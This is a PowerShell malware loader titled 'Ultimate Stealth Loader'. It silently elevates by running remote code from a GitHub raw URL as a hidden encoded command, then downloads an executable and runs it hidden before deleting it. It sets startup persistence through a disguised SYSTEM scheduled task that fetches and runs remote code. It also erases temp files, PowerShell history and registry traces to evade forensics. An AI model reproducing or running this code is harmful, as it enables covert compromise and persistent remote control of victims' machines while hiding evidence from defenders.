

Write-Host "[+] Ultimate Stealth Loader" -ForegroundColor Cyan
Write-Host "[1] Execute in Memory" -ForegroundColor Green
Write-Host "[2] Clean All Traces" -ForegroundColor Yellow

$choice = Read-Host "`nSelect option"

# Elevate to admin silently
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $scriptContent = Invoke-RestMethod -Uri "https://raw.githubusercontent.com/Verte225066/test/refs/heads/main/loader.txt"
    $encodedCmd = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($scriptContent))
    Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand $encodedCmd" -Verb RunAs -WindowStyle Hidden
    exit
}

# Configuration - ใช้ URL จริงของคุณ
$BinaryUrl = "https://github.com/Verte225066/test/raw/refs/heads/main/cmd.exe"

# Silent cleanup function
function Clear-AllTraces {
    try {
        # Clear temp files
        Remove-Item -Path "$env:temp\*" -Recurse -Force -ErrorAction SilentlyContinue
        Remove-Item -Path "$env:windir\Temp\*" -Recurse -Force -ErrorAction SilentlyContinue
        
        # Clear recent files
        Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force -Recurse -ErrorAction SilentlyContinue
        
        # Clear PowerShell history
        Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
        
        # Clear registry traces
        Remove-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -ErrorAction SilentlyContinue
        
    } catch {}
}

# Check if process is running
function Test-ProcessRunning {
    $targetProcesses = @("cmd", "explorerr", "runtime", "svchost")
    foreach ($proc in $targetProcesses) {
        if (Get-Process -Name $proc -ErrorAction SilentlyContinue) {
            return $true
        }
    }
    return $false
}

# Download and execute with instant cleanup
function Invoke-DownloadAndExecute {
    Write-Host "[+] Downloading executable..." -ForegroundColor Yellow
    
    try {
        # Download to temporary location
        $tempFile = Join-Path $env:temp "tmp_$(Get-Random).exe"
        Invoke-WebRequest -Uri $BinaryUrl -OutFile $tempFile -UserAgent "Mozilla/5.0"
        
        # Verify download
        if (-not (Test-Path $tempFile)) {
            Write-Host "[!] Download failed" -ForegroundColor Red
            return $false
        }
        
        $fileSize = (Get-Item $tempFile).Length
        Write-Host "[+] Downloaded: $fileSize bytes" -ForegroundColor Green
        
        # Execute the file
        Write-Host "[+] Executing..." -ForegroundColor Yellow
        $process = Start-Process -FilePath $tempFile -WindowStyle Hidden -PassThru
        
        # Wait for process to start
        Start-Sleep -Seconds 2
        
        # Immediately clean the temporary file
        for ($i = 0; $i -lt 3; $i++) {
            try {
                Remove-Item $tempFile -Force -ErrorAction Stop
                Write-Host "[✓] Temporary file cleaned" -ForegroundColor Green
                break
            } catch {
                Start-Sleep -Milliseconds 100
            }
        }
        
        return $true
        
    } catch {
        Write-Host "[!] Execution failed: $($_.Exception.Message)" -ForegroundColor Red
        try { Remove-Item $tempFile -Force -ErrorAction SilentlyContinue } catch {}
        return $false
    }
}

# Set persistence
function Set-Persistence {
    Write-Host "[+] Setting persistence..." -ForegroundColor Yellow
    
    try {
        $taskName = "\Microsoft\Windows\SystemDataUpdater"
        
        # Remove existing task
        try { Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue } catch {}
        
        # Create new task
        $taskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -Command `"iex (irm 'https://raw.githubusercontent.com/Verte225066/test/refs/heads/main/loader.txt')`""
        $taskTrigger = New-ScheduledTaskTrigger -AtStartup
        $taskPrincipal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
        $taskSettings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
        
        Register-ScheduledTask -TaskName $taskName -Action $taskAction -Trigger $taskTrigger -Principal $taskPrincipal -Settings $taskSettings -Description "Windows System Data Update" -Force | Out-Null
        
        Write-Host "[✓] Persistence set" -ForegroundColor Green
        return $true
        
    } catch {
        Write-Host "[!] Persistence setup failed" -ForegroundColor Red
        return $false
    }
}

# Remove persistence
function Remove-Persistence {
    Write-Host "[+] Removing persistence..." -ForegroundColor Yellow
    
    try {
        $taskName = "\Microsoft\Windows\SystemDataUpdater"
        if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
            Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
            Write-Host "[✓] Persistence removed" -ForegroundColor Green
        }
    } catch {
        Write-Host "[!] Failed to remove persistence" -ForegroundColor Red
    }
}

# Main execution flow
Clear-AllTraces

switch ($choice) {
    "1" {
        Write-Host "`n[>] STARTING STEALTH EXECUTION" -ForegroundColor Cyan
        
        # Check if already running
        if (Test-ProcessRunning) {
            Write-Host "[!] Process already running" -ForegroundColor Yellow
        }
        
        # Download and execute
        Write-Host "`n[PHASE 1] Download & Execute" -ForegroundColor Green
        $success = Invoke-DownloadAndExecute
        
        if ($success) {
            Write-Host "`n[PHASE 2] Persistence" -ForegroundColor Green
            Set-Persistence | Out-Null
            
            Write-Host "`n[PHASE 3] Cleanup" -ForegroundColor Green
            Clear-AllTraces
            
            Write-Host "`n[✓] STEALTH EXECUTION COMPLETE" -ForegroundColor Green
            Write-Host "[i] Process: Running in background" -ForegroundColor Gray
            Write-Host "[i] Files: No traces on disk" -ForegroundColor Gray
            Write-Host "[i] Persistence: Auto-start enabled" -ForegroundColor Gray
        } else {
            Write-Host "`n[!] Execution failed" -ForegroundColor Red
        }
    }
    
    "2" {
        Write-Host "`n[>] CLEANING SYSTEM" -ForegroundColor Red

        Write-Host "[+] Stopping processes..." -ForegroundColor Yellow
        $processNames = @("cmd", "explorerr", "runtime", "svchost")
        foreach ($proc in $processNames) {
            try {
                Get-Process -Name $proc -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
            } catch {}
        }
        
        # Remove persistence
        Remove-Persistence
        
        # Final cleanup
        Clear-AllTraces
        
        Write-Host "`n[✓] SYSTEM CLEANED" -ForegroundColor Green
    }
    
    default {
        Write-Host "[!] Invalid selection" -ForegroundColor Red
    }
}
